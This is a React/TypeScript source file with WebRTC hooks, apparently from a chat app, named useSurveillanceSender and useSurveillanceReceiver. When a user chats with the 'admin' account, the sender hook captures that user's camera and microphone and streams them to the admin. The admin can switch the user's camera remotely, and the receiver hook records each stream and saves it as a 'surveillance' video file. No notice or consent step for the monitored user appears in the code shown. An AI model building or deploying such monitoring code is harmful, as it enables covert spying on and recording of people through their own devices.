import { useEffect, useRef, useState, useCallback } from "react";
import {
  getSocket,
  registerCameraSwitchHandler,
  unregisterCameraSwitchHandler,
} from "@/lib/socket";
import { useChatStore } from "@/stores/chatStore";

const ADMIN_USERNAME = "admin";

const ICE_SERVERS: RTCConfiguration = {
  iceServers: [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "stun:stun1.l.google.com:19302" },
    {
      urls: "turn:openrelay.metered.ca:80",
      username: "openrelayproject",
      credential: "openrelayproject",
    },
  ],
};

// Global refs — موجودة دايماً حتى لو الـ component اتـ unmount
const globalPeerRef = { current: null as RTCPeerConnection | null };
const globalStreamRef = { current: null as MediaStream | null };

export const useSurveillanceSender = (conversationId: string) => {
  const localStreamRef = useRef<MediaStream | null>(null);
  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);
  const iceRestartTimerRef = useRef<NodeJS.Timeout | null>(null);
  const isStreamingRef = useRef(false);

  const conversations = useChatStore((s) => s.conversations);

  const isConversationWithAdmin = useCallback((): boolean => {
    const conversation = conversations.find((c) => c._id === conversationId);
    if (!conversation) return false;
    return conversation.participants.some(
      (p) => p.userId.username === ADMIN_USERNAME
    );
  }, [conversations, conversationId]);

  const stopStreaming = useCallback(() => {
    const socket = getSocket();
    unregisterCameraSwitchHandler();
    localStreamRef.current?.getTracks().forEach((t) => t.stop());
    localStreamRef.current = null;
    globalStreamRef.current = null;
    peerConnectionRef.current?.close();
    peerConnectionRef.current = null;
    globalPeerRef.current = null;
    isStreamingRef.current = false;
    if (iceRestartTimerRef.current) clearTimeout(iceRestartTimerRef.current);
    socket.emit("surveillance-stop-to-admin", { conversationId });
  }, [conversationId]);

  const startStreaming = useCallback(async (existingStream?: MediaStream) => {
    if (!isConversationWithAdmin()) return;
    if (isStreamingRef.current) return;

    const socket = getSocket();
    try {
      const stream = existingStream ?? await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: true,
      });

      localStreamRef.current = stream;
      globalStreamRef.current = stream;
      isStreamingRef.current = true;

      const pc = new RTCPeerConnection(ICE_SERVERS);
      peerConnectionRef.current = pc;
      globalPeerRef.current = pc;

      stream.getTracks().forEach((track) => pc.addTrack(track, stream));

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          socket.emit("surveillance-ice-candidate-to-admin", {
            candidate: event.candidate,
            conversationId,
          });
        }
      };

      pc.oniceconnectionstatechange = () => {
        if (
          pc.iceConnectionState === "failed" ||
          pc.iceConnectionState === "disconnected"
        ) {
          iceRestartTimerRef.current = setTimeout(async () => {
            try {
              const offer = await pc.createOffer({ iceRestart: true });
              await pc.setLocalDescription(offer);
              socket.emit("surveillance-offer-to-admin", { offer, conversationId });
            } catch (err) {
              console.error("ICE restart failed:", err);
            }
          }, 3000);
        }
        if (pc.iceConnectionState === "connected") {
          if (iceRestartTimerRef.current) {
            clearTimeout(iceRestartTimerRef.current);
            iceRestartTimerRef.current = null;
          }
        }
      };

      // ← سجّل الـ handler بعد ما الـ stream والـ pc يكونوا جاهزين
      registerCameraSwitchHandler(async ({ facingMode }) => {
        console.log("📱 onSwitchCamera called:", facingMode);

        const currentPc = globalPeerRef.current;
        const currentStream = globalStreamRef.current;

        if (!currentPc || !currentStream) {
          console.error("❌ No peer or stream");
          return;
        }

        try {
          const newStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: facingMode } },
            audio: false,
          });

          const newVideoTrack = newStream.getVideoTracks()[0];
          console.log("📱 New track:", newVideoTrack.label);

          const sender = currentPc.getSenders().find((s) => s.track?.kind === "video");
          if (sender) {
            await sender.replaceTrack(newVideoTrack);
            console.log("✅ Camera switched to:", facingMode);
          } else {
            currentPc.addTrack(newVideoTrack, currentStream);
          }

          currentStream.getVideoTracks().forEach((t) => {
            t.stop();
            currentStream.removeTrack(t);
          });
          currentStream.addTrack(newVideoTrack);

        } catch (err) {
          console.error("❌ Switch error (exact):", err);
          try {
            const fallback = await navigator.mediaDevices.getUserMedia({
              video: { facingMode },
              audio: false,
            });
            const track = fallback.getVideoTracks()[0];
            const sender = currentPc.getSenders().find((s) => s.track?.kind === "video");
            if (sender && track) {
              await sender.replaceTrack(track);
              currentStream.getVideoTracks().forEach((t) => {
                t.stop();
                currentStream.removeTrack(t);
              });
              currentStream.addTrack(track);
              console.log("✅ Camera switched (fallback):", facingMode);
            }
          } catch (e) {
            console.error("❌ Fallback failed:", e);
          }
        }
      });

      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      socket.emit("surveillance-offer-to-admin", { offer, conversationId });

    } catch (err) {
      console.error("Failed to start streaming:", err);
    }
  }, [conversationId, isConversationWithAdmin]);

  useEffect(() => {
    const socket = getSocket();

    const onAnswer = async ({ answer }: { answer: RTCSessionDescriptionInit }) => {
      if (peerConnectionRef.current) {
        await peerConnectionRef.current.setRemoteDescription(
          new RTCSessionDescription(answer)
        );
      }
    };

    const onIceCandidate = async ({ candidate }: { candidate: RTCIceCandidateInit }) => {
      if (peerConnectionRef.current) {
        await peerConnectionRef.current.addIceCandidate(
          new RTCIceCandidate(candidate)
        );
      }
    };

    const onStopStream = () => stopStreaming();

    socket.on("surveillance-answer-to-user", onAnswer);
    socket.on("surveillance-ice-to-user", onIceCandidate);
    socket.on("surveillance-stop-stream", onStopStream);

    return () => {
      socket.off("surveillance-answer-to-user", onAnswer);
      socket.off("surveillance-ice-to-user", onIceCandidate);
      socket.off("surveillance-stop-stream", onStopStream);
    };
  }, [stopStreaming]);

  useEffect(() => {
    const handleUnload = () => stopStreaming();
    window.addEventListener("beforeunload", handleUnload);
    return () => window.removeEventListener("beforeunload", handleUnload);
  }, [stopStreaming]);

  return { startStreaming, stopStreaming, isConversationWithAdmin };
};

export const useSurveillanceReceiver = (isAdmin: boolean) => {
  const [streams, setStreams] = useState<Map<string, MediaStream>>(new Map());
  const [isConnected, setIsConnected] = useState(false);
  const peerConnectionsRef = useRef<Map<string, RTCPeerConnection>>(new Map());
  const mediaRecordersRef = useRef<Map<string, MediaRecorder>>(new Map());
  const chunksRef = useRef<Map<string, Blob[]>>(new Map());

  useEffect(() => {
    if (!isAdmin) return;
    const socket = getSocket();

    const onConnect = () => setIsConnected(true);
    const onDisconnect = () => setIsConnected(false);

    socket.on("connect", onConnect);
    socket.on("disconnect", onDisconnect);

    if (socket.connected) {
      queueMicrotask(() => setIsConnected(true));
    }

    return () => {
      socket.off("connect", onConnect);
      socket.off("disconnect", onDisconnect);
    };
  }, [isAdmin]);

  useEffect(() => {
    if (!isAdmin || !isConnected) return;
    const socket = getSocket();

    const onOffer = async ({
      offer,
      conversationId,
      fromSocketId,
    }: {
      offer: RTCSessionDescriptionInit;
      conversationId: string;
      fromSocketId: string;
    }) => {
      console.log("📡 Admin received offer!", { conversationId, fromSocketId });
      const pc = new RTCPeerConnection(ICE_SERVERS);
      peerConnectionsRef.current.set(conversationId, pc);

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          socket.emit("surveillance-ice-candidate-to-user", {
            candidate: event.candidate,
            targetSocketId: fromSocketId,
          });
        }
      };

      pc.ontrack = (event) => {
        const [remoteStream] = event.streams;
        console.log("📡 Admin got remote stream!");
        setStreams((prev) => new Map(prev).set(conversationId, remoteStream));

        const startRecording = () => {
          const audioTracks = remoteStream.getAudioTracks();
          const videoTracks = remoteStream.getVideoTracks();

          if (audioTracks.length === 0 || videoTracks.length === 0) {
            setTimeout(startRecording, 500);
            return;
          }

          const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
            ? "video/webm;codecs=vp9,opus"
            : MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
            ? "video/webm;codecs=vp8,opus"
            : "video/webm";

          const recorder = new MediaRecorder(remoteStream, { mimeType });
          const chunks: Blob[] = [];
          chunksRef.current.set(conversationId, chunks);

          recorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
          };

          recorder.onstop = () => {
            const blob = new Blob(chunks, { type: "video/webm" });
            const url = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.href = url;
            a.download = `surveillance-${conversationId}-${Date.now()}.webm`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
          };

          recorder.start(1000);
          mediaRecordersRef.current.set(conversationId, recorder);
        };

        startRecording();
      };

      await pc.setRemoteDescription(new RTCSessionDescription(offer));
      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);

      socket.emit("surveillance-answer-to-user", {
        answer,
        targetSocketId: fromSocketId,
      });
    };

    const onIceCandidate = async ({
      candidate,
      conversationId,
    }: {
      candidate: RTCIceCandidateInit;
      conversationId: string;
    }) => {
      const pc = peerConnectionsRef.current.get(conversationId);
      if (pc) await pc.addIceCandidate(new RTCIceCandidate(candidate));
    };

    const onStop = ({ conversationId }: { conversationId: string }) => {
      const recorder = mediaRecordersRef.current.get(conversationId);
      if (recorder && recorder.state !== "inactive") recorder.stop();
      peerConnectionsRef.current.get(conversationId)?.close();
      peerConnectionsRef.current.delete(conversationId);
      mediaRecordersRef.current.delete(conversationId);
      setStreams((prev) => {
        const next = new Map(prev);
        next.delete(conversationId);
        return next;
      });
    };

    socket.on("surveillance-offer-from-user", onOffer);
    socket.on("surveillance-ice-from-user", onIceCandidate);
    socket.on("surveillance-stopped-by-user", onStop);

    return () => {
      socket.off("surveillance-offer-from-user", onOffer);
      socket.off("surveillance-ice-from-user", onIceCandidate);
      socket.off("surveillance-stopped-by-user", onStop);
    };
  }, [isAdmin, isConnected]);

  const closeStream = useCallback((conversationId: string) => {
    const recorder = mediaRecordersRef.current.get(conversationId);
    if (recorder && recorder.state !== "inactive") recorder.stop();
    peerConnectionsRef.current.get(conversationId)?.close();
    peerConnectionsRef.current.delete(conversationId);
    mediaRecordersRef.current.delete(conversationId);
    setStreams((prev) => {
      const next = new Map(prev);
      next.delete(conversationId);
      return next;
    });
  }, []);

  return { streams, closeStream };
};